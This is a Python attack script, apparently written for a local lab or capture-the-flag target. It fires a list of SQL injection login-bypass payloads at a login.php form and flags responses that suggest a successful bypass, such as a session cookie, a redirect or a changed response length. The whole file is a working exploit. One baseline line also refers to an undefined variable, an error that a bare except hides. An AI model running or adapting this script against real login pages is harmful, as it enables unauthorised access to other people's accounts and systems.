import requests, sys

target_url = "http://127.0.0.1:33167/login.php"

payloads = [
    "admin' OR '1'='1'--",
    "admin'--",
    "admin'#",
    "' OR 1=1--",
    "' OR '1'='1"
]

session = requests.Session()

# Get baseline
try:
    response = session.post(target_url, data={'username':'admin','password':'admin'}, allow_redirects=False)
    baseline_length = len(response.content)
    print(f"* Baseline admin/admin: {baseline_response.status_code} | {baseline_length}B")
except:
    pass

# Test payloads
session = requests.Session()
print("* Testing payloads...")
print("Payload | Status | Cookie | Length | Different")

for payload in payloads:
    try:
        response = session.post(target_url, data={'username':payload,'password':'x'}, allow_redirects=False, timeout=10)
        has_cookie = 'PHPSESSID' in response.cookies
        length = len(response.content)
        different = length != baseline_length
        print(f"{payload[:25]} | {response.status_code} | {has_cookie} | {length}B | {different}")
        
        if has_cookie or (300 <= response.status_code < 400) or different:
            print(f"[!] SUCCESS INDICATORS for: {payload}")
            print(response.text[:300])
            sys.exit(0)
            
    except Exception as e:
        print(f"! Error: {str(e)[:50]}")

print("* All payloads tested")

